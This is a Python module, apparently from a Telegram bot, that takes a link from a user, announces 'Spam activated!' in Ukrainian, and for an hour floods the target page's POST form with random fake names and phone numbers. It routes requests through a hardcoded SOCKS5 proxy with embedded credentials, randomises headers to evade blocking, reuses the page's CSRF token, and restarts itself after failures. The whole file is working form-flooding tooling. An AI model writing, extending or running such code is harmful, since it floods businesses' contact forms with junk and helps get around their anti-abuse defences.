import aiohttp
import asyncio
import random
import logging
from bs4 import BeautifulSoup
from aiohttp_socks import ProxyConnector
from modules.names import names, phones  # Імпорт масивів зі значеннями
from modules.headers import generate_random_headers  # Імпорт функції з headers.py
import time
# Налаштування логування
logger = logging.getLogger(__name__)

# Проксі дані
PROXY = 'socks5://Uj8pHTcd:LFFKzhza@connect-uasocks.net:1080'

# Функція для відправки форми з детальним логуванням
async def send_form(session, url, form_data, i, delay, max_retries=3):
    headers = generate_random_headers(url)  # Генеруємо випадкові заголовки для кожної форми
    
    for attempt in range(max_retries):
        try:
            await asyncio.sleep(delay)  # Затримка перед запитом
            async with session.post(url, data=form_data, headers=headers) as form_response:
                if form_response.status == 200:
                    logger.info(f"Форма {i+1} успішно відправлена!")
                    return  # Успішне відправлення, виходимо з функції
                elif form_response.status == 403:
                    logger.error(f"Не вдалося відправити форму {i+1}. Доступ заборонений (403).")
                elif form_response.status == 429:
                    logger.error(f"Не вдалося відправити форму {i+1}. Занадто багато запитів (429).")
                else:
                    logger.error(f"Не вдалося відправити форму {i+1}. Статус-код: {form_response.status}")
        except aiohttp.ClientError as e:
            if isinstance(e, aiohttp.ServerDisconnectedError):
                logger.warning(f"Сервер відключився при відправці форми {i+1}. Спроба {attempt+1} з {max_retries}")
                if attempt < max_retries - 1:
                    await asyncio.sleep(2)  # Затримка перед повторною спробою
                continue
            logger.error(f"Помилка при відправці форми {i+1}: {e}")
            logger.error(f"Деталі помилки: {e.__class__.__name__}, {str(e)}")
            break
        except Exception as ex:
            logger.error(f"Невідома помилка при відправці форми {i+1}: {ex}")
            logger.error(f"Деталі: {ex.__class__.__name__}, {str(ex)}")
            break

# Генератор для створення завдань з затримкою
async def generate_tasks(session, tasks, initial_delay=0.3, max_retries=3):
    tasks_list = []
    delay = initial_delay  # Початкова затримка

    for i, (url, form_data) in enumerate(tasks):
        tasks_list.append(send_form(session, url, form_data, i, delay, max_retries))
        delay += 0.4  # Збільшення затримки після кожної форми
    
    return tasks_list

# Функція для отримання і відправки форм
async def receive_link(update, context) -> None:
    try:
        link = update.message.text
       
        
        # Використовуємо create_task для паралельної обробки кожного запиту
        asyncio.create_task(process_link(update, link))
    
    except Exception as e:
        logger.error(f"Помилка в receive_link: {e}")
      

# Окрема асинхронна функція для обробки кожного запиту протягом певного часу
async def process_link(update, link, duration_minutes=60):
    end_time = time.time() + duration_minutes * 60  # Час завершення через 60 хвилин
    connector = ProxyConnector.from_url(PROXY)

    try:
        while time.time() < end_time:
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.get(link) as response:
                    if response.status == 200:
                        soup = BeautifulSoup(await response.text(), 'html.parser')

                        form = soup.find('form', method='post')
                        if form:
                            tasks = []
                            while time.time() < end_time:
                                form_data = {
                                    'name': random.choice(names),
                                    'phone': random.choice(phones),
                                }

                                csrf_token = form.find('input', {'name': 'csrf_token'})
                                if csrf_token:
                                    form_data['csrf_token'] = csrf_token['value']

                                action_url = form.get('action')
                                full_url = link if action_url.startswith('http') else f"{link.rstrip('/')}/{action_url.lstrip('/')}"

                                if not full_url.startswith(('http://', 'https://')):
                                    logger.error(f"Некоректний URL: {full_url}")
                                    continue

                                tasks.append((full_url, form_data))
                                # Відправляємо завдання на виконання
                                tasks_list = await generate_tasks(session, tasks, initial_delay=0.5)
                                await asyncio.gather(*tasks_list)
                      

    except Exception as e:
        logger.error(f"Помилка в process_link: {e}")
       
        # Затримка на 10 хвилин перед повторним запуском
    
        await asyncio.sleep(600)  # Затримка 10 хвилин
        await process_link(update, link, duration_minutes)  # Перезапуск після 10 хв

# Зміни у функції receive_link для передачі тривалості
async def receive_link(update, context) -> None:
    try:
        link = update.message.text
        await update.message.reply_text(f"Дякую! Спам активовано!")
        
        # Наприклад, передаємо 60 хвилин як тривалість
        asyncio.create_task(process_link(update, link, duration_minutes=60))
    
    except Exception as e:
        logger.error(f"Помилка в receive_link: {e}")
     